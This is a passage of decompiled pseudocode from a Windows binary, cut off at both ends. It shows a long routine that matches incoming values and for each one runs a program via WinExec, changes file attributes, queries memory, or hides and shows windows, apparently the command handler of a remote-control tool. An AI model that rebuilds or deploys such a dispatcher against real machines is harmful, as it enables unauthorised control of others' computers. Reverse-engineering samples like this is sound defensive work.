var_268h = &fcn.00474f94::var_354h;\n    var_26ch = 0x476518;\n    fcn.00405a44();\n    var_26ch = 0x476528;\n    fcn.00405974();\n    if (uVar11) {\n        var_26ch = 0x476540;\n        fcn.00405a84();\n        var_26ch = 0;\n        var_270h = 0x476547;\n        sub.ole32.dll_CoInitialize();\n        var_270h = &fcn.00474f94::var_ch;\n        var_274h = 0x476558;\n        fcn.00405b28();\n        var_274h = 0x476568;\n        fcn.00405a44();\n        var_274h = 0x476575;\n        fcn.00405b28();\n        var_274h = 0x476584;\n        fcn.00405a84();\n        var_274h = &fcn.00474f94::var_10h;\n        var_278h = 0x476595;\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        var_278h = 0x4765a5;\n        fcn.00405a44();\n        var_278h = 0x4765b2;\n        fcn.00405b28();\n        var_278h = 0x4765c1;\n        fcn.00405a84();\n        var_278h = 0x4765cc;\n        fcn.004055c8();\n        var_278h = 0x4765da;\n        fcn.0046885c();\n        var_278h = 0x4765df;\n        sub.ole32.dll_CoUninitialize();\n    }\n    var_278h = &fcn.00474f94::var_358h;\n    var_27ch = 0x4765f8;\n    fcn.00405a44();\n    var_27ch = 0x476608;\n    fcn.00405974();\n    if (uVar11) {\n        var_27ch = 0x476620;\n        fcn.00405a84();\n        var_27ch = &fcn.00474f94::var_ch;\n        var_280h = 0x476631;\n        fcn.00405b28();\n        var_280h = 0x476641;\n        fcn.00405a44();\n        var_280h = 0x47664e;\n        fcn.00405b28();\n        var_280h = 0x47665d;\n        fcn.00405a84();\n        var_280h = 0x476668;\n        fcn.004055c8();\n        var_280h = 0x476676;\n        fcn.0040a590();\n        var_280h = 0x476684;\n        fcn.00405818();\n        var_280h = 0x476692;\n        cVar1 = fcn.00467e98();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            var_280h = 0x4766a0;\n            fcn.00474d1c();\n        }\n    }\n    var_280h = &fcn.00474f94::var_360h;\n    var_284h = 0x4766b9;\n    fcn.00405a44();\n    var_284h = 0x4766c9;\n    fcn.00405974();\n    if (uVar11) {\n        var_284h = 0x4766dd;\n        fcn.00405a84();\n        var_284h = &fcn.00474f94::var_ch;\n        var_288h = 0x4766ee;\n        fcn.00405b28();\n        var_288h = 0x4766fe;\n        fcn.00405a44();\n        var_288h = 0x47670b;\n        fcn.00405b28();\n        var_288h = 0x47671a;\n        fcn.00405a84();\n        var_288h = 0x476725;\n        fcn.004055c8();\n        var_288h = 0x476730;\n        cVar1 = fcn.00467e98();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            var_288h = 0x47673e;\n            fcn.00474d1c();\n        }\n    }\n    var_288h = &fcn.00474f94::var_364h;\n    var_28ch = 0x476757;\n    fcn.00405a44();\n    var_28ch = 0x476767;\n    fcn.00405974();\n    if (uVar11) {\n        var_28ch = &fcn.00474f94::var_368h;\n        var_290h = 0x47678b;\n        fcn.00405a44();\n        var_290h = 0x476796;\n        cVar1 = fcn.00467e7c();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            var_290h = 0x4767b0;\n            fcn.00474d1c();\n        }\n        else {\n            var_290h = 0x4767a4;\n            fcn.00474d1c();\n        }\n    }\n    var_290h = &fcn.00474f94::var_36ch;\n    var_294h = 0x4767c9;\n    fcn.00405a44();\n    var_294h = 0x4767d9;\n    fcn.00405974();\n    if (uVar11) {\n        var_294h = 0x4767ed;\n        fcn.00405a84();\n        var_294h = 0x4767f5;\n        cVar1 = fcn.0048ac60();\n        uVar11 = cVar1 == '\\0';\n        if (uVar11) {\n            var_294h = 0x47c868;\n            var_298h = var_8h;\n            var_29ch = 0x47c878;\n            var_2a0h = 0x476816;\n            fcn.004058e0();\n            var_2a0h = 0x476821;\n            fcn.004677d8();\n        }\n        var_2a0h = 0x47682b;\n        fcn.00474d1c();\n    }\n    var_2a0h = &fcn.00474f94::var_374h;\n    var_2a4h = 0x476844;\n    fcn.00405a44();\n    var_2a4h = 0x476854;\n    fcn.00405974();\n    if (uVar11) {\n        var_2a4h = 0x476868;\n        fcn.00405a84();\n        var_2a4h = 2;\n        var_2a8h = 0x476872;\n        var_2a8h = fcn.004059dc();\n        var_2ach = 0x476878;\n        sub.kernel32.dll_SetFileAttributesA();\n    }\n    var_2ach = &fcn.00474f94::var_378h;\n    var_2b0h = 0x476891;\n    fcn.00405a44();\n    var_2b0h = 0x4768a1;\n    fcn.00405974();\n    if (uVar11) {\n        var_2b0h = 0x4768b5;\n        fcn.00405a84();\n        var_2b0h = 0x80;\n        var_2b4h = 0x4768c2;\n        var_2b4h = fcn.004059dc();\n        var_2b8h = 0x4768c8;\n        sub.kernel32.dll_SetFileAttributesA();\n    }\n    var_2b8h = 0x4768d5;\n    fcn.00405974();\n    if (uVar11) {\n        var_2b8h = &fcn.00474f94::lpBuffer;\n        var_2bch = 0x4768e3;\n        sub.kernel32.dll_GlobalMemoryStatus();\n        var_2bch = 0x47c8b0;\n        var_2c0h = 0x4768ed;\n        fcn.00468a1c();\n        var_2c0h = 0x4768f8;\n        fcn.00409d60();\n        var_2c0h = var_380h;\n        var_2c4h = 0x47c330;\n        var_2c8h = &fcn.00474f94::var_384h;\n        var_38ch = var_204h;\n        var_388h = var_388h & 0xffffff00;\n        uVar11 = 1;\n        var_2cch = 0x47692f;\n        fcn.0040af88(var_2c8h);\n        var_2cch = var_384h;\n        var_2d0h = 0x476945;\n        fcn.004058e0();\n        var_2d0h = 0x476950;\n        fcn.00474d1c();\n    }\n    var_2b8h = &fcn.00474f94::var_390h;\n    var_2bch = 0x476969;\n    fcn.00405a44();\n    var_2bch = 0x476979;\n    fcn.00405974();\n    if (uVar11) {\n        var_2bch = 0x476986;\n        fcn.00468b90();\n        var_2bch = 0x47699c;\n        fcn.00405864();\n        var_2bch = 0x4769a7;\n        fcn.00474d1c();\n    }\n    var_2bch = &fcn.00474f94::var_39ch;\n    var_2c0h = 0x4769c0;\n    fcn.00405a44();\n    var_2c0h = 0x4769d0;\n    fcn.00405974();\n    if (uVar11) {\n        var_2c0h = 0x4769e4;\n        fcn.00405a84();\n        var_2c4h = 0x4769f0;\n        var_2c0h = &stack0xfffffffc;\n        fcn.00483c78();\n        var_2c4h = 0x476a03;\n        fcn.00474ec8(var_2c0h);\n    }\n    var_2c0h = &fcn.00474f94::var_3a4h;\n    var_2c4h = 0x476a1d;\n    fcn.00405a44();\n    var_2c4h = 0x476a2d;\n    fcn.00405974();\n    if (uVar11) {\n        var_2c4h = 0x476a45;\n        fcn.00405a84();\n        var_2c4h = &fcn.00474f94::var_ch;\n        var_2c8h = 0x476a56;\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        var_2c8h = 0x476a66;\n        fcn.00405a44();\n        var_2c8h = 0x476a73;\n        fcn.00405b28();\n        var_2c8h = 0x476a82;\n        fcn.00405a84();\n        var_2c8h = 0x476a8d;\n        fcn.004055c8();\n        var_2cch = 0x476a96;\n        var_2c8h = &stack0xfffffffc;\n        fcn.00409ecc();\n        var_2cch = 0x476aa1;\n        fcn.00468270();\n        var_2cch = 0x476ab4;\n        fcn.00474ec8(var_2c8h);\n    }\n    var_2c8h = &fcn.00474f94::var_3ach;\n    var_2cch = 0x476ace;\n    fcn.00405a44();\n    var_2cch = 0x476ade;\n    fcn.00405974();\n    if (uVar11) {\n        var_2cch = 0x476af6;\n        fcn.00405a84();\n        var_2cch = &fcn.00474f94::var_ch;\n        var_2d0h = 0x476b07;\n        fcn.00405b28();\n        var_2d0h = 0x476b17;\n        fcn.00405a44();\n        var_2d0h = 0x476b24;\n        fcn.00405b28();\n        var_2d0h = 0x476b33;\n        fcn.00405a84();\n        var_2d0h = 0x476b3b;\n        iVar9 = fcn.00409ecc();\n        uVar11 = iVar9 == 0;\n        if (0 < iVar9) {\n            iVar5 = 1;\n            iVar10 = iVar9;\n            do {\n                if (iVar9 == iVar5) {\n                    var_2d0h = 0x476ba6;\n                    fcn.00409ecc();\n                    var_2d0h = 0x476bab;\n                    fcn.00483944();\n                }\n                else {\n                    var_2cch = &fcn.00474f94::var_3b0h;\n                    var_2d4h = 0x476b60;\n                    fcn.00405b28();\n                    var_2d4h = 0x476b70;\n                    fcn.00405a44();\n                    var_2d4h = 0x476b7b;\n                    fcn.00409ecc();\n                    var_2d4h = 0x476b80;\n                    fcn.00483944();\n                    var_2d4h = 0x476b8d;\n                    fcn.00405b28();\n                    var_2d4h = 0x476b9c;\n                    fcn.00405a84();\n                }\n                iVar5 = iVar5 + 1;\n                iVar10 = iVar10 + -1;\n                uVar11 = iVar10 == 0;\n            } while (!uVar11);\n        }\n        var_2d0h = 0x476bb9;\n        fcn.00474d1c();\n    }\n    var_2d0h = &fcn.00474f94::var_3b4h;\n    var_2d4h = 0x476bd2;\n    fcn.00405a44();\n    var_2d4h = 0x476be2;\n    fcn.00405974();\n    if (uVar11) {\n        var_2d4h = 0x476bfa;\n        fcn.00405a84();\n        var_2d4h = 0x476c06;\n        var_1a8h = fcn.00404620();\n        var_2d8h = 0x476c8a;\n        var_2dch = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.00474f94::var_2dch;\n        var_2e0h = 0x476c28;\n        var_2d4h = &stack0xfffffffc;\n        (**(*var_1a8h + 0x2c))();\n        do {\n            var_2e0h = 0x476c3b;\n            (**(*var_1a8h + 0xc))();\n            var_2e0h = 0x476c46;\n            fcn.00409ecc();\n            var_2e0h = 0x476c4b;\n            fcn.00483944();\n            var_2e0h = 0x476c58;\n            (**(*var_1a8h + 0x48))();\n            var_2e0h = 0x476c63;\n            iVar9 = (**(*var_1a8h + 0x14))();\n        } while (iVar9 != 0);\n        var_2e0h = 0x476c71;\n        fcn.00474d1c();\n        *in_FS_OFFSET = var_2dch;\n        var_2d4h = 0x476c91;\n        var_2d8h = 0x476c89;\n        fcn.00404650();\n        return;\n    }\n    var_2d4h = &fcn.00474f94::var_3bch;\n    var_2d8h = 0x476caa;\n    fcn.00405a44();\n    var_2d8h = 0x476cba;\n    fcn.00405974();\n    if (uVar11) {\n        var_2d8h = 0x476cce;\n        fcn.00405a84();\n        var_2d8h = 0x476cd6;\n        fcn.00409ecc();\n        var_2d8h = 0x476cdb;\n        fcn.00483944();\n        var_2d8h = 0x476ce5;\n        fcn.00474d1c();\n    }\n    var_2d8h = &fcn.00474f94::var_3c0h;\n    var_2dch = 0x476cfe;\n    fcn.00405a44();\n    var_2dch = 0x476d0e;\n    fcn.00405974();\n    if (uVar11) {\n        var_2dch = 0x476d26;\n        fcn.00405a84();\n        var_2dch = &fcn.00474f94::var_ch;\n        var_2e0h = 0x476d37;\n        fcn.00405b28();\n        var_2e0h = 0x476d47;\n        fcn.00405a44();\n        var_2e0h = 0x476d54;\n        fcn.00405b28();\n        var_2e0h = 0x476d63;\n        fcn.00405a84();\n        var_2e0h = &fcn.00474f94::var_10h;\n        var_2e4h = 0x476d74;\n        fcn.00405b28();\n        var_2e4h = 0x476d84;\n        fcn.00405a44();\n        var_2e4h = 0x476d91;\n        fcn.00405b28();\n        var_2e4h = 0x476da0;\n        fcn.00405a84();\n        var_2e4h = &fcn.00474f94::var_14h;\n        var_2e8h = 0x476db1;\n        fcn.00405b28();\n        var_2e8h = 0x476dc1;\n        fcn.00405a44();\n        var_2e8h = 0x476dce;\n        fcn.00405b28();\n        var_2e8h = 0x476ddd;\n        fcn.00405a84();\n        var_2e8h = &fcn.00474f94::var_18h;\n        var_2ech = 0x476dee;\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        var_2ech = 0x476dfe;\n        fcn.00405a44();\n        var_2ech = 0x476e0b;\n        fcn.00405b28();\n        var_2ech = 0x476e1a;\n        fcn.00405a84();\n        var_2ech = 0x476e25;\n        fcn.004055c8();\n        var_2f0h = 0x476e37;\n        var_2ech = &stack0xfffffffc;\n        fcn.00468e64();\n        var_2f0h = var_3c8h;\n        var_2f4h = 0x47c330;\n        var_2f8h = 0x476e53;\n        fcn.00468f24();\n        var_2f8h = var_3cch;\n        var_2fch = 0x476e69;\n        fcn.004058e0();\n        var_2fch = 0x476e7a;\n        fcn.00474ec8(var_2f8h);\n    }\n    var_2f8h = &fcn.00474f94::var_3d0h;\n    var_2fch = 0x476e94;\n    fcn.00405a44();\n    var_2fch = 0x476ea4;\n    fcn.00405974();\n    if (uVar11) {\n        var_2fch = 0x476ebc;\n        fcn.00405a84();\n        var_2fch = &fcn.00474f94::var_ch;\n        var_300h = 0x476ed2;\n        fcn.00405a44();\n        var_300h = 0x476ee4;\n        fcn.00405a84();\n        var_300h = &fcn.00474f94::var_10h;\n        var_304h = 0x476ef5;\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        var_304h = 0x476f05;\n        fcn.00405a44();\n        var_304h = 0x476f12;\n        fcn.00405b28();\n        var_304h = 0x476f21;\n        fcn.00405a84();\n        var_304h = 0x476f2f;\n        fcn.00468548();\n    }\n    var_304h = &fcn.00474f94::var_3d4h;\n    var_308h = 0x476f48;\n    fcn.00405a44();\n    var_308h = 0x476f58;\n    fcn.00405974();\n    if (uVar11) {\n        var_308h = 0x476f6c;\n        fcn.00405a84();\n        uVar11 = var_8h == NULL || var_8h == 0x4;\n        var_308h = &fcn.00474f94::var_3d8h;\n        var_30ch = 0x476f8e;\n        fcn.00405a44();\n        var_30ch = var_3d8h;\n        var_310h = &fcn.00474f94::var_3dch;\n        var_314h = 0x476fae;\n        fcn.00405a44();\n        var_310h = 0x476fba;\n        fcn.004686b0();\n    }\n    var_310h = &fcn.00474f94::var_3e0h;\n    var_314h = 0x476fd3;\n    fcn.00405a44();\n    var_314h = 0x476fe3;\n    fcn.00405974();\n    if (uVar11) {\n        var_314h = 0x476ff7;\n        fcn.00405a84();\n        uVar11 = var_8h == NULL || var_8h == 0x4;\n        var_314h = &fcn.00474f94::var_3e4h;\n        var_318h = 0x477019;\n        fcn.00405a44();\n        var_318h = var_3e4h;\n        var_31ch = &fcn.00474f94::var_3e8h;\n        var_320h = 0x477039;\n        fcn.00405a44();\n        var_31ch = 0x477045;\n        fcn.004683c8();\n    }\n    var_31ch = &fcn.00474f94::var_3ech;\n    var_320h = 0x47705e;\n    fcn.00405a44();\n    var_320h = 0x47706e;\n    fcn.00405974();\n    if (uVar11) {\n        var_320h = 0x477086;\n        fcn.00405a84();\n        var_320h = &fcn.00474f94::var_ch;\n        var_324h = 0x477097;\n        fcn.00405b28();\n        var_324h = 0x4770a7;\n        fcn.00405a44();\n        var_324h = 0x4770b4;\n        fcn.00405b28();\n        var_324h = 0x4770c3;\n        fcn.00405a84();\n        var_324h = &fcn.00474f94::var_10h;\n        var_328h = 0x4770d4;\n        fcn.00405b28();\n        var_328h = 0x4770e4;\n        fcn.00405a44();\n        var_328h = 0x4770f1;\n        fcn.00405b28();\n        var_328h = 0x477100;\n        fcn.00405a84();\n        var_328h = &fcn.00474f94::var_14h;\n        var_32ch = 0x477111;\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        var_32ch = 0x477121;\n        fcn.00405a44();\n        var_32ch = 0x47712e;\n        fcn.00405b28();\n        var_32ch = 0x47713d;\n        fcn.00405a84();\n        var_32ch = var_8h;\n        var_330h = 0x47714f;\n        fcn.004694d0(var_8h);\n    }\n    var_330h = &fcn.00474f94::var_3f0h;\n    var_334h = 0x477168;\n    fcn.00405a44();\n    var_334h = 0x477178;\n    fcn.00405974();\n    if (uVar11) {\n        var_334h = 0x477190;\n        fcn.00405a84();\n        var_334h = &fcn.00474f94::var_ch;\n        var_338h = 0x4771a1;\n        fcn.00405b28();\n        var_338h = 0x4771b1;\n        fcn.00405a44();\n        var_338h = 0x4771be;\n        fcn.00405b28();\n        var_338h = 0x4771cd;\n        fcn.00405a84();\n        var_338h = &fcn.00474f94::var_10h;\n        var_33ch = 0x4771de;\n        fcn.00405b28();\n        var_33ch = 0x4771ee;\n        fcn.00405a44();\n        var_33ch = 0x4771fb;\n        fcn.00405b28();\n        var_33ch = 0x47720a;\n        fcn.00405a84();\n        var_33ch = &fcn.00474f94::var_14h;\n        var_340h = 0x47721b;\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        var_340h = 0x47722b;\n        fcn.00405a44();\n        var_340h = 0x477238;\n        fcn.00405b28();\n        var_340h = 0x477247;\n        fcn.00405a84();\n        var_340h = var_8h;\n        var_344h = 0x477259;\n        fcn.00469304(var_8h);\n    }\n    var_344h = &fcn.00474f94::var_3f4h;\n    var_348h = 0x477272;\n    fcn.00405a44();\n    var_348h = 0x477282;\n    fcn.00405974();\n    if (uVar11) {\n        var_348h = 0x47729a;\n        fcn.00405a84();\n        var_348h = &fcn.00474f94::var_ch;\n        var_34ch = 0x4772ab;\n        fcn.00405b28();\n        var_34ch = 0x4772bb;\n        fcn.00405a44();\n        var_34ch = 0x4772c8;\n        fcn.00405b28();\n        var_34ch = 0x4772d7;\n        fcn.00405a84();\n        var_34ch = &fcn.00474f94::var_10h;\n        var_350h = 0x4772e8;\n        fcn.00405b28();\n        var_350h = 0x4772f8;\n        fcn.00405a44();\n        var_350h = 0x477305;\n        fcn.00405b28();\n        var_350h = 0x477314;\n        fcn.00405a84();\n        var_350h = &fcn.00474f94::var_14h;\n        var_354h = 0x477325;\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        var_354h = 0x477335;\n        fcn.00405a44();\n        var_354h = 0x477342;\n        fcn.00405b28();\n        var_354h = 0x477351;\n        fcn.00405a84();\n        var_354h = var_8h;\n        var_358h = 0x477363;\n        fcn.004693ec(var_8h);\n    }\n    var_358h = &fcn.00474f94::var_3f8h;\n    var_35ch = 0x47737c;\n    fcn.00405a44();\n    var_35ch = 0x47738c;\n    fcn.00405974();\n    if (uVar11) {\n        var_35ch = 0x4773a4;\n        fcn.00405a84();\n        var_35ch = &fcn.00474f94::var_ch;\n        var_360h = 0x4773b5;\n        fcn.00405b28();\n        var_360h = 0x4773c5;\n        fcn.00405a44();\n        var_360h = 0x4773d2;\n        fcn.00405b28();\n        var_360h = 0x4773e1;\n        fcn.00405a84();\n        var_360h = &fcn.00474f94::var_10h;\n        var_364h = 0x4773f2;\n        fcn.00405b28();\n        var_364h = 0x477402;\n        fcn.00405a44();\n        var_364h = 0x47740f;\n        fcn.00405b28();\n        var_364h = 0x47741e;\n        fcn.00405a84();\n        var_364h = &fcn.00474f94::var_14h;\n        var_368h = 0x47742f;\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        var_368h = 0x47743f;\n        fcn.00405a44();\n        var_368h = 0x47744c;\n        fcn.00405b28();\n        var_368h = 0x47745b;\n        fcn.00405a84();\n        var_368h = 0x477466;\n        fcn.004055c8();\n        var_368h = 0x477473;\n        fcn.00405974();\n        if (uVar11) {\n            var_36ch = 0x477481;\n            var_368h = &stack0xfffffffc;\n            fcn.004697fc();\n            var_36ch = &fcn.00474f94::var_3fch;\n            var_370h = 0x477493;\n            fcn.00469a28();\n            var_36ch = 0x47749f;\n            fcn.00405818();\n            var_36ch = 0x4774b0;\n            fcn.00474ec8(var_368h);\n        }\n        else {\n            var_36ch = 0x4774bf;\n            var_368h = &stack0xfffffffc;\n            fcn.004697fc();\n            var_36ch = 0x4774d0;\n            fcn.00474ec8(var_368h);\n        }\n    }\n    var_368h = &fcn.00474f94::var_408h;\n    var_36ch = 0x4774ea;\n    fcn.00405a44();\n    var_36ch = 0x4774fa;\n    fcn.00405974();\n    if (uVar11) {\n        var_36ch = 0x47750e;\n        fcn.00405a84();\n        var_36ch = NULL;\n        var_370h = 0;\n        var_374h = 0x10;\n        var_378h = 0x47751c;\n        var_378h = fcn.00409ecc();\n        var_37ch = 0x477522;\n        sub.user32.dll_SendMessageA();\n    }\n    var_37ch = &fcn.00474f94::var_40ch;\n    var_380h = 0x47753b;\n    fcn.00405a44();\n    var_380h = 0x47754b;\n    fcn.00405974();\n    if (uVar11) {\n        var_380h = 0x47755f;\n        fcn.00405a84();\n        var_380h = 0x3;\n        var_384h = 0x477569;\n        var_384h = fcn.00409ecc();\n        var_388h = 0x47756f;\n        sub.user32.dll_ShowWindow();\n    }\n    var_388h = &fcn.00474f94::var_410h;\n    var_38ch = 0x477588;\n    fcn.00405a44();\n    var_38ch = 0x477598;\n    fcn.00405974();\n    if (uVar11) {\n        var_38ch = 0x4775ac;\n        fcn.00405a84();\n        var_38ch = 6;\n        var_390h = 0x4775b6;\n        var_390h = fcn.00409ecc();\n        var_394h = 0x4775bc;\n        sub.user32.dll_ShowWindow();\n    }\n    var_394h = &fcn.00474f94::var_414h;\n    var_398h = 0x4775d5;\n    fcn.00405a44();\n    var_398h = 0x4775e5;\n    fcn.00405974();\n    if (uVar11) {\n        var_398h = 0x4775f9;\n        fcn.00405a84();\n        var_398h = 0;\n        var_39ch = 0x477603;\n        var_39ch = fcn.00409ecc();\n        var_3a0h = 0x477609;\n        sub.user32.dll_ShowWindow();\n    }\n    var_3a0h = &fcn.00474f94::var_418h;\n    var_3a4h = 0x477622;\n    fcn.00405a44();\n    var_3a4h = 0x477632;\n    fcn.00405974();\n    if (uVar11) {\n        var_3a4h = 0x477646;\n        fcn.00405a84();\n        var_3a4h = 5;\n        var_3a8h = 0x477650;\n        var_3a8h = fcn.00409ecc();\n        var_3ach = 0x477656;\n        sub.user32.dll_ShowWindow();\n    }\n    var_3ach = &fcn.00474f94::var_41ch;\n    var_3b0h = 0x47766f;\n    fcn.00405a44();\n    var_3b0h = 0x47767f;\n    fcn.00405974();\n    if (uVar11) {\n        var_3b0h = 0x477693;\n        fcn.00405a84();\n        var_3b0h = &fcn.00474f94::var_ch;\n        var_3b4h = 0x4776a4;\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        var_3b4h = 0x4776b4;\n        fcn.00405a44();\n        var_3b4h = 0x4776c1;\n        fcn.00405b28();\n        var_3b4h = 0x4776d0;\n        fcn.00405a84();\n        var_3b4h = 0x4776db;\n        fcn.004055c8();\n        var_3b4h = 0x4776e3;\n        var_3b4h = fcn.004059dc();\n        var_3b8h = 0x4776ec;\n        var_3b8h = fcn.00409ecc();\n        var_3bch = 0x4776f2;\n        sub.user32.dll_SetWindowTextA();\n    }\n    var_3bch = &fcn.00474f94::var_420h;\n    var_3c0h = 0x47770b;\n    fcn.00405a44();\n    var_3c0h = 0x47771b;\n    fcn.00405974();\n    if (uVar11) {\n        var_3c0h = 0x477733;\n        fcn.00405a84();\n        var_3c0h = &fcn.00474f94::var_ch;\n        var_3c4h = 0x477744;\n        fcn.00405b28();\n        var_3c4h = 0x477754;\n        fcn.00405a44();\n        var_3c4h = 0x477761;\n        fcn.00405b28();\n        var_3c4h = 0x477770;\n        fcn.00405a84();\n        var_3c4h = &fcn.00474f94::var_10h;\n        var_3c8h = 0x477781;\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        var_3c8h = 0x477791;\n        fcn.00405a44();\n        var_3c8h = 0x47779e;\n        fcn.00405b28();\n        var_3c8h = 0x4777ad;\n        fcn.00405a84();\n        var_3c8h = 0x4777b8;\n        fcn.004055c8();\n        var_3cch = 0x4777c4;\n        var_3c8h = &stack0xfffffffc;\n        fcn.00488ac8();\n        var_3cch = 0x4777d5;\n        fcn.00474ec8(var_3c8h);\n    }\n    var_3c8h = &fcn.00474f94::var_428h;\n    var_3cch = 0x4777ef;\n    fcn.00405a44();\n    var_3cch = 0x4777ff;\n    fcn.00405974();\n    if (uVar11) {\n        var_3cch = 0x477813;\n        fcn.00405a84();\n        var_3cch = 0x47781b;\n        fcn.00488d74();\n    }\n    var_3cch = &fcn.00474f94::var_42ch;\n    var_3d0h = 0x477834;\n    fcn.00405a44();\n    var_3d0h = 0x477844;\n    fcn.00405974();\n    if (uVar11) {\n        var_3d0h = 0x477858;\n        fcn.00405a84();\n        var_3d0h = &fcn.00474f94::var_ch;\n        var_3d4h = 0x477869;\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        var_3d4h = 0x477879;\n        fcn.00405a44();\n        var_3d4h = 0x477886;\n        fcn.00405b28();\n        var_3d4h = 0x477895;\n        fcn.00405a84();\n        var_3d4h = 0x4778a0;\n        fcn.004055c8();\n        var_3d4h = 0x4778ab;\n        fcn.00488e28();\n    }\n    var_3d4h = &fcn.00474f94::var_430h;\n    var_3d8h = 0x4778c4;\n    fcn.00405a44();\n    var_3d8h = 0x4778d4;\n    fcn.00405974();\n    if (uVar11) {\n        var_3d8h = 0x4778e8;\n        fcn.00405a84();\n        var_3d8h = 5;\n        var_3dch = 0x4778f2;\n        var_3dch = fcn.004059dc();\n        var_3e0h = 0x4778f8;\n        sub.kernel32.dll_WinExec();\n    }\n    var_3e0h = &fcn.00474f94::var_434h;\n    var_3e4h = 0x477911;\n    fcn.00405a44();\n    var_3e4h = 0x477921;\n    fcn.00405974();\n    if (uVar11) {\n        var_3e4h = 0x477939;\n        fcn.00405a84();\n        var_3e4h = &fcn.00474f94::var_ch;\n        var_3e8h = 0x47794a;\n        fcn.00405b28();\n        var_3e8h = 0x47795a;\n        fcn.00405a44();\n        var_3e8h = 0x477967;\n        fcn.00405b28();\n        var_3e8h = 0x477976;\n        fcn.00405a84();\n        var_3e8h = &fcn.00474f94::var_10h;\n        var_3ech = 0x477987;\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        var_3ech = 0x477997;\n        fcn.00405a44();\n        var_3ech = 0x4779a4;\n        fcn.00405b28();\n        var_3ech = 0x4779b3;\n        fcn.00405a84();\n        var_3ech = 0x4779be;\n        fcn.004055c8();\n        var_3f0h = 0x4779ca;\n        var_3ech = &stack0xfffffffc;\n        fcn.0046baac();\n        var_3f0h = 0x4779db;\n        fcn.00474ec8(var_3ech);\n    }\n    var_3ech = &fcn.00474f94::var_43ch;\n    var_3f0h = 0x4779f5;\n    fcn.00405a44();\n    var_3f0h = 0x477a05;\n    fcn.00405974();\n    if (uVar11) {\n        var_3f0h = 0x477a19;\n        fcn.00405a84();\n        var_3f0h = 0x477a24;\n        fcn.00467e4c();\n        var_3f0h = 0x477a32;\n        fcn.004681a4();\n    }\n    var_3f0h = &fcn.00474f94::var_444h;\n    var_3f4h = 0x477a4b;\n    fcn.00405a44();\n    var_3f4h = 0x477a5b;\n    fcn.00405974();\n    if (uVar11) {\n        var_3f4h = 0x477a6f;\n        fcn.00405a84();\n        var_3f4h = 0x477a7a;\n        fcn.00467e4c();\n        var_3f4h = 0x477a88;\n        fcn.004680dc();\n    }\n    var_3f4h = &fcn.00474f94::var_44ch;\n    var_3f8h = 0x477aa1;\n    fcn.00405a44();\n    var_3f8h = 0x477ab1;\n    fcn.00405974();\n    if (uVar11) {\n        var_3f8h = 0x477ac5;\n        fcn.00405a84();\n        var_3f8h = 0x477acd;\n        fcn.0046ba1c();\n    }\n    var_3f8h = &fcn.00474f94::var_450h;\n    var_3fch = 0x477ae6;\n    fcn.00405a44();\n    var_3fch = 0x477af6;\n    fcn.00405974();\n    if (uVar11) {\n        var_3fch = 0x477b0e;\n        fcn.00405a84();\n        var_3fch = &fcn.00474f94::var_ch;\n        var_400h = 0x477b1f;\n        fcn.00405b28();\n        var_400h = 0x477b2f;\n        fcn.00405a44();\n        var_400h = 0x477b3c;\n        fcn.00405b28();\n        var_400h = 0x477b4b;\n        fcn.00405a84();\n        var_400h = &fcn.00474f94::var_10h;\n        var_404h = 0x477b5c;\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        var_404h = 0x477b6c;\n        fcn.00405a44();\n        var_404h = 0x477b79;\n        fcn.00405b28();\n        var_404h = 0x477b88;\n        fcn.00405a84();\n        var_404h = 0x477b93;\n        fcn.004055c8();\n        var_404h = 0x477b9b;\n        fcn.004059dc();\n        var_404h = 0x477ba8;\n        fcn.00405728();\n        var_404h = var_454h;\n        var_408h = 0x477bb7;\n        var_408h = fcn.004059dc();\n        var_40ch = 0x477bc0;\n        fcn.004059dc();\n        var_404h = 0x477bc7;\n        fcn.0046bcbc();\n    }\n    var_404h = &fcn.00474f94::var_458h;\n    var_408h = 0x477be0;\n    fcn.00405a44();\n    var_408h = 0x477bf0;\n    fcn.00405974();\n    if (uVar11) {\n        var_408h = 0x477c08;\n        fcn.00405a84();\n        var_408h = &fcn.00474f94::var_ch;\n        var_40ch = 0x477c19;\n        fcn.00405b28();\n        var_40ch = 0x477c29;\n        fcn.00405a44();\n        var_40ch = 0x477c36;\n        fcn.00405b28();\n        var_40ch = 0x477c45;\n        fcn.00405a84();\n        var_40ch = &fcn.00474f94::var_10h;\n        var_410h = 0x477c56;\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        var_410h = 0x477c66;\n        fcn.00405a44();\n        var_410h = 0x477c73;\n        fcn.00405b28();\n        var_410h = 0x477c82;\n        fcn.00405a84();\n        var_410h = 0x477c8d;\n        fcn.004055c8();\n        var_414h = 0x477c99;\n        var_410h = &stack0xfffffffc;\n        fcn.00469bb0();\n        var_414h = 0x477caa;\n        fcn.00474ec8(var_410h);\n    }\n    var_410h = &fcn.00474f94::var_460h;\n    var_414h = 0x477cc4;\n    fcn.00405a44();\n    var_414h = 0x477cd4;\n    fcn.00405974();\n    if (uVar11) {\n        var_414h = 0x477cec;\n        fcn.00405a84();\n        var_414h = &fcn.00474f94::var_ch;\n        var_418h = 0x477cfd;\n        iVar9 = fcn.00405b28();\n        uVar11 = iVar9 == 1;\n        var_418h = 0x477d0d;\n        fcn.00405a44();\n        var_418h = 0x477d1a;\n        fcn.00405b28();\n        var_418h = 0x477d29;\n        fcn.00405a84();\n        var_418h = 0x477d34;\n        fcn.004055c8();\n        var_418h = 0x477d3f;\n        fcn.004055c8();\n        var_418h = 0x477d51;\n        